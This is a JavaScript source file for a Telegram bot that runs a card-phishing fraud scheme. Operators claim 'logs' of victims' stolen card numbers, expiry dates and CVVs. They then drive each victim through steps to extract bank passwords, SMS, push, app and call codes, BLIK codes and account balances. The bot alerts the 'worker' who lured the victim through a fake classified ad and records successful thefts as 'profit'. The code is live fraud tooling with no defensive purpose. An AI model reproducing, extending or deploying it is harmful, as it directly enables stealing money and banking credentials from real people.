const { Composer, Markup } = require("telegraf");
const { Log, Ad } = require("../database");
const locale = require("../locale");
const binInfo = require("../helpers/binInfo");
const composer = new Composer();

composer.action(/^log_(\d+)_wrong_(code|lk|picture|push)$/, async (ctx) => {
  try {
    const log = await Log.findByPk(ctx.match[1], {
      include: [
        {
          association: "ad",
          required: true,
          include: [
            {
              association: "user",
              required: true,
            },
            {
              association: "service",
              required: true,
              include: [
                {
                  association: "country",
                  required: true,
                },
                {
                  association: "currency",
                  required: true,
                },
              ],
            },
          ],
        },
        {
          association: "writer",
          required: true,
        },
      ],
    });
    if (!log) return ctx.answerCbQuery("❌ Лог не найден", true).catch((err) => err);
    if (log.writerId && log.writerId != ctx.from.id)
      return ctx.answerCbQuery("❌ Этот лог взял на вбив кто-то другой", true).catch((err) => err);
    if (!log.writerId)
      await log.update({
        writerId: ctx.from.id,
      });

    await ctx.answerCbQuery("🔔 Воркер уведомлён").catch((err) => err);
    ctx.telegram
      .sendMessage(
        log.ad.userId,
        `<b>${locale.wrongWorkerStatuses[ctx.match[2]]} ${log.ad.service.title}</b>
      
📦 Объявление: <b>${log.ad.title}</b>
💰 Цена: <b>${log.ad.price}</b>`,
        {
          parse_mode: "HTML",
        }
      )
      .catch((err) => err);
  } catch (err) {
    ctx.answerCbQuery("❌ Ошибка", true).catch((err) => err);
  }
});

composer.action(
  /^log_(\d+)_(passwordBank|push|sms|lk|blik|appCode|callCode|picture|otherCard|limits|forVerify|correctBalance|profit|leave)$/,
  async (ctx) => {
    try {
      const log = await Log.findByPk(ctx.match[1], {
        include: [
          {
            association: "ad",
            required: true,
            include: [
              {
                association: "user",
                required: true,
              },
              {
                association: "service",
                required: true,
                include: [
                  {
                    association: "country",
                    required: true,
                  },
                  {
                    association: "currency",
                    required: true,
                  },
                ],
              },
            ],
          },
          {
            association: "writer",
            required: true,
          },
        ],
      });
      if (!log) return ctx.answerCbQuery("❌ Лог не найден", true).catch((err) => err);
      if (log.writerId && log.writerId != ctx.from.id)
        return ctx.answerCbQuery("❌ Этот лог взял на вбив кто-то другой", true).catch((err) => err);
      if (!log.writerId)
        await log.update({
          writerId: ctx.from.id,
        });

      if (ctx.match[2] == "leave") {
        await log.update({
          writerId: null,
        });
        await ctx.answerCbQuery("✅ Вы успешно вышли со вбива этого лога", true).catch((err) => err);
        return await ctx
          .editMessageReplyMarkup(Markup.inlineKeyboard([[Markup.callbackButton(`✍️ Взять на вбив`, `take_log_${log.id}`)]]))
          .catch((err) => err);
      }

      await log.update({
        status: ctx.match[2],
        smsCode: null,
      });

      if (log.status == "profit") {
        await ctx.answerCbQuery("🎉 Поздравляем с успешным вбивом!").catch((err) => err);
        return ctx.scene.enter(`admin_add_profit`, {
          userId: log.ad.userId,
          serviceTitle: log.ad.service.title,
          currency: log.ad.service.currency.code,
        });
      }
      await ctx.answerCbQuery(`✅ Вы успешно изменили статус лога на "${locale.statuses[log.status]}"`, true).catch((err) => err);

      ctx.telegram
        .sendMessage(
          log.ad.userId,
          `<b>${locale.workerStatuses[log.status]} ${log.ad.service.title}</b>
      
📦 Объявление: <b>${log.ad.title}</b>
💰 Цена: <b>${log.ad.price}</b>`,
          {
            parse_mode: "HTML",
          },
          {
            parse_mode: "HTML",
          }
        )
        .catch((err) => err);
      var bank;
      try {
        const cardInfo = await binInfo(String(log.cardNumber).substr(0, 8));
        bank = cardInfo?.bank;
      } catch (err) {}
      return ctx
        .editMessageReplyMarkup(
          Markup.inlineKeyboard([
            [Markup.callbackButton("✅ ПРОФИТ", `log_${log.id}_profit`)],
            [Markup.callbackButton(`Текущий статус: ${locale.statuses[log.status]}`, "none")],
            [Markup.callbackButton(`Взял на вбив ${log.writer.username}`, "none")],
            [Markup.callbackButton("📱 ПУШ", `log_${log.id}_push`), Markup.callbackButton("📥 СМС-КОД", `log_${log.id}_sms`)],
            ...(log.ad.service.country.withLk ? [[Markup.callbackButton("🔐 ЛК", `log_${log.id}_lk`)]] : []),
            [
              Markup.callbackButton("📬 КОД С ПРИЛОЖЕНИЯ", `log_${log.id}_appCode`),
              Markup.callbackButton("☎️ КОД ИЗ ЗВОНКА", `log_${log.id}_callCode`),
            ],
            ...(String(bank).match(/MILLENNIUM/giu) ? [[Markup.callbackButton("🖼 КАРТИНКА", `log_${log.id}_picture`)]] : []),
            ...(["pl"].includes(log.ad.service.country.id) ? [[Markup.callbackButton("#️⃣ БЛИК", `log_${log.id}_blik`)]] : []),
            [
              Markup.callbackButton("⚠️ ЛИМИТЫ", `log_${log.id}_limits`),
              Markup.callbackButton("⚠️ ДРУГАЯ КАРТА", `log_${log.id}_otherCard`),
            ],
            [
              Markup.callbackButton("⚠️ ТОЧНЫЙ БАЛАНС", `log_${log.id}_correctBalance`),
              ...(["ua"].includes(log.ad.service.country.id)
                ? [Markup.callbackButton("⚠️ НУЖЕН БАЛАНС", `log_${log.id}_forVerify`)]
                : []),
            ],
            [
              Markup.callbackButton("❌ Неверный КОД", `log_${log.id}_wrong_code`),
              ...(log.ad.service.country.withLk ? [Markup.callbackButton("❌ Неверный ЛК", `log_${log.id}_wrong_lk`)] : []),
            ],
            [
              ...(String(bank).match(/MILLENNIUM/giu)
                ? [Markup.callbackButton("❌ Неверная КАРТИНКА", `log_${log.id}_wrong_picture`)]
                : []),
              Markup.callbackButton("❌ Не подтверждает ПУШ", `log_${log.id}_wrong_push`),
            ],
            [Markup.callbackButton("🔐 Пароль от банка", `log_${log.id}_passwordBank`)],
            [Markup.callbackButton("🚪 Выйти со вбива", `log_${log.id}_leave`)],
          ])
        )
        .catch((err) => err);
    } catch (err) {
      ctx.answerCbQuery("❌ Ошибка", true).catch((err) => err);
    }
  }
);

composer.action(/^take_log_(\d+)_([0-9]+)_link$/, async (ctx) => {
  try {
    const log = await Log.findByPk(ctx.match[1], {
      include: [
        {
          association: "ad",
          required: true,
          include: [
            {
              association: "user",
              required: true,
            },
            {
              association: "service",
              required: true,
              include: [
                {
                  association: "country",
                  required: true,
                },
              ],
            },
          ],
        },
      ],
    });
    const ad = await Ad.findByPk(ctx.match[2]);
    if (!log) return ctx.answerCbQuery("❌ Лог не найден", true).catch((err) => err);
    if (log.writerId && log.writerId != ctx.from.id)
      return ctx.answerCbQuery("❌ Этот лог взял на вбив кто-то другой", true).catch((err) => err);

    await log.update({
      writerId: ctx.from.id,
    });
    await ad.update({
      writeId: ctx.from.id,
    });

    await ctx.answerCbQuery("✅ Удачного вбива").catch((err) => err);
    var bank;
    try {
      const cardInfo = await binInfo(String(log.cardNumber).substr(0, 8));
      bank = cardInfo?.bank;
    } catch (err) {}
    await ctx
      .editMessageReplyMarkup(Markup.inlineKeyboard([[Markup.callbackButton(`Взял на вбив ${ctx.state.user.username}`, "none")]]))
      .catch((err) => err);
    await ctx.telegram.sendMessage(ctx.from.id, 
      `<b>✏️ Ввод карты</b>

💳 Номер карты: <b>${log.cardNumber}</b>
📅 Срок действия: <b>${log.cardExpire}</b>
🔒 CVV: <b>${log.cardCvv}</b>

👨🏻‍💻 Воркер:<b>${ad.userId}</b>
👤 ID Воркера: <code>${ad.userId}</code>

⚡️ ID Объявления: <code>${ad.id}</code>
📦 Объявление: <b>${ad.title}</b>
💰 Цена: <b>${ad.price}</b>`, {
      parse_mode: "HTML",
      reply_markup: Markup.inlineKeyboard([
        [Markup.callbackButton("✅ ПРОФИТ", `log_${log.id}_profit`)],
        [Markup.callbackButton(`Взял на вбив ${ctx.state.user.username}`, "none")],
        [Markup.callbackButton("📱 ПУШ", `log_${log.id}_push`), Markup.callbackButton("📥 СМС-КОД", `log_${log.id}_sms`)],
        ...(log.ad.service.country.withLk ? [[Markup.callbackButton("🔐 ЛК", `log_${log.id}_lk`)]] : []),
        [
          Markup.callbackButton("📬 КОД С ПРИЛОЖЕНИЯ", `log_${log.id}_appCode`),
          Markup.callbackButton("☎️ КОД ИЗ ЗВОНКА", `log_${log.id}_callCode`),
        ],
        ...(String(bank).match(/MILLENNIUM/giu) ? [[Markup.callbackButton("🖼 КАРТИНКА", `log_${log.id}_picture`)]] : []),
        ...(["pl"].includes(log.ad.service.country.id) ? [[Markup.callbackButton("#️⃣ БЛИК", `log_${log.id}_blik`)]] : []),
        [
          Markup.callbackButton("⚠️ ЛИМИТЫ", `log_${log.id}_limits`),
          Markup.callbackButton("⚠️ ДРУГАЯ КАРТА", `log_${log.id}_otherCard`),
        ],
        [
          Markup.callbackButton("⚠️ ТОЧНЫЙ БАЛАНС", `log_${log.id}_correctBalance`),
          ...(["ua"].includes(log.ad.service.country.id)
            ? [Markup.callbackButton("⚠️ НУЖЕН БАЛАНС", `log_${log.id}_forVerify`)]
            : []),
        ],
        [
          Markup.callbackButton("❌ Неверный КОД", `log_${log.id}_wrong_code`),
          ...(log.ad.service.country.withLk ? [Markup.callbackButton("❌ Неверный ЛК", `log_${log.id}_wrong_lk`)] : []),
        ],
        [
          ...(String(bank).match(/MILLENNIUM/giu)
            ? [Markup.callbackButton("❌ Неверная КАРТИНКА", `log_${log.id}_wrong_picture`)]
            : []),
          Markup.callbackButton("❌ Не подтверждает ПУШ", `log_${log.id}_wrong_push`),
        ],
        [Markup.callbackButton("🔐 Пароль от банка", `log_${log.id}_passwordBank`)],
        [Markup.callbackButton("🚪 Выйти со вбива", `log_${log.id}_leave`)],
      ]),
    });
    await ctx.telegram
      .sendMessage(
        log.ad.userId,
        `ℹ️ Ваш лог <b>${log.ad.service.title}</b> вбивает <b><a href="tg://user?id=${ctx.from.id}">${ctx.state.user.username}</a></b>
      
📦 Объявление: <b>${log.ad.title}</b>
💰 Цена: <b>${log.ad.price}</b>`,
        {
          parse_mode: "HTML",
        }
      )
      .catch((err) => err);
  } catch (err) {
    console.log(err);
    ctx.answerCbQuery("❌ Ошибка", true).catch((err) => err);
  }
});

module.exports = composer;
